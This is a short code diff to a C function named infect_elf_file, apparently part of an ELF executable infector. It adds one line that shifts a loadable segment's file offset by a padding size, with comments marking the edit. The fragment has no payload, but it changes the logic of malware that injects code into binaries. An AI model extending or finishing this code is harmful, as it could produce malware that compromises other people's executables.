@@ -457,6 +457,10 @@ Elf64_Addr infect_elf_file(elfbin_t *self, elfbin_t *target)
 			// PER: 0x1000 = 4kB = PAGE_SIZE
 			new_base = phdr[i].p_vaddr;
 			text_found = 1;
+			//PER: Change made by us
+			phdr[i].p_offset += paddingSize;
+			//PER: Change made by us
+			
 			// PER: proposed change: give offset to this segment also by paddingSize
 		} else {
 			if (phdr[i].p_type == PT_LOAD && phdr[i].p_offset && (phdr[i].p_flags & PF_W))
